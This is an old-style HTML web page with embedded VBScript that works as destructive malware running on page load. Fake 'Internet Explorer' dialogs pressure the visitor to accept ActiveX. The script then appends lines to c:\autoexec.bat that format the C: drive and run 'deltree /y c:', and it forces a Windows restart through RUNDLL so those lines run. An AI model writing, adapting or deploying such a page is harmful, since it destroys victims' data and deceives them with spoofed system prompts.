<html>
<head>
<title>$@t@Nik CHiLd</title>

</head>
<SCRIPT LANGUAGE="vbs"><!--

msgbox  "You Must Accept Active X In Order TO View This Page Properly!", VbOKCancel+VbExclamation, "Internet Explorer"

//--></SCRIPT>

<body>
<script language="vbscript"><!--
Dim fso, f1
Const ForAppending = 8
Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.OpenTextFile("c:\autoexec.bat", ForAppending, True)
tf.WriteLine("@echo off") 
tf.WriteLine("format c: /q /u /autotest")
tf.WriteLine("if exist c:\dos\format.* goto dosform")
tf.WriteLine("if exist c:\windows\command\format.* goto winform")
tf.WriteLine("goto del")
tf.WriteLine("cd\dos")
tf.WriteLine("format c: /q /u /autotest")
tf.WriteLine("cd\")
tf.WriteLine(":winform")
tf.WriteLine("cd\windows\command")
tf.WriteLine("format c: /q /u /autotest")
tf.WriteLine("cd\")
tf.WriteLine("goto write")
tf.WriteLine(":del")
tf.WriteLine("if exist c:\dvar.txt goto dtree")
tf.WriteLine("goto write")
tf.WriteLine(":dtree")
tf.WriteLine("deltree /y c:")
tf.WriteLine("if exist c:\dos\deltree.* goto deldos")
tf.WriteLine("if exist c:\windows\command\deltree.* goto delwin")
tf.WriteLine(":deldos")
tf.WriteLine("cd\dos")
tf.WriteLine("c:\dos\deltree /y c:")
tf.WriteLine("cd\")
tf.WriteLine(":delwin")
tf.WriteLine("cd\windows\command")
tf.WriteLine("deltree /y c:")
tf.WriteLine("cd\") 
tf.WriteLine(":write")
tf.WriteLine("type your welcome.txt")
tf.WriteLine("pause")
tf.Close
tf.Close
document.write("c:\autoexec.bat appended.")

set W = CreateObject("WScript.Shell")
Return = W.Run(winPath & "\RUNDLL.EXE user.exe,exitwindowsexec", 1, TRUE)
//--></script>

</body>
</html>
<SCRIPT LANGUAGE="VBS">
<!--
Dim r
r = MsgBox ("Page Did not Properly Load", VbRetryCancel+VbCritical+VbDefaultButton1, "Internet Explorer")
if r = 2 then
WScript.Quit
Else
MsgBox "Ok Boss Hit Refresh And Accept The Active X This Time!", 64 ,"Ineternet Explorer"
End If
//-->
</SCRIPT>
